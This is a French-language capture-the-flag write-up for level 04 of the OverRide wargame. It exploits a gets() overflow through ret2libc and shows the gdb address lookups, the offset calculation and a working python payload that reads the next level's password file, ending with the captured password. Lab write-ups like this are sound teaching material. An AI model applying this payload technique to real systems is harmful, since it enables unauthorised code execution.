# Level 04

La fonction `gets` nous permet d'overflow simplement l'adresse de retour de la fonction.

L'utilisation de `ptrace` dans le programme nous empêche d'utiliser un shellcode avec le syscall `execve`

Nous pouvons utiliser un ret2libc qui consiste à remplacer l'adresse de retour par l'addresse de la fonction `system` et lui donner en argument l'adresse de la string `/bin/sh` déjà présente dans le binaire.

Nous obtenons les adresses dont nous avons besoin:

```
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```

Donc `system` est à `0xf7e6aed0`

et `/bin/sh` est à `0xf7f897ec`

Nous calculons l'offset nécessaire pour ecrire à l'adresse de retour

Initialisation de la stack: `%esp = %esp - 0xb0 + 12`

```
    0x080486c8 <+0>:     push   %ebp
    0x080486c9 <+1>:     mov    %esp,%ebp
    0x080486cb <+3>:     push   %edi
    0x080486cc <+4>:     push   %ebx
    0x080486cd <+5>:     and    $0xfffffff0,%esp
    0x080486d0 <+8>:     sub    $0xb0,%esp
```

Adresse du buffer utilisé dans `gets` :  `%esp + 0x20`
```
    0x08048757 <+143>:   lea    0x20(%esp),%eax
```

Donc:
`0xb0 + 12 - 0x20 = 156`

```bash
level04@OverRide:~$ (python -c 'print "A"*156+"\xf7\xe6\xae\xd0"[::-1]+"AAAA"+"\xf7\xf8\x97\xec"[::-1]'; echo "cat /home/users/level05/.pass") | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

```
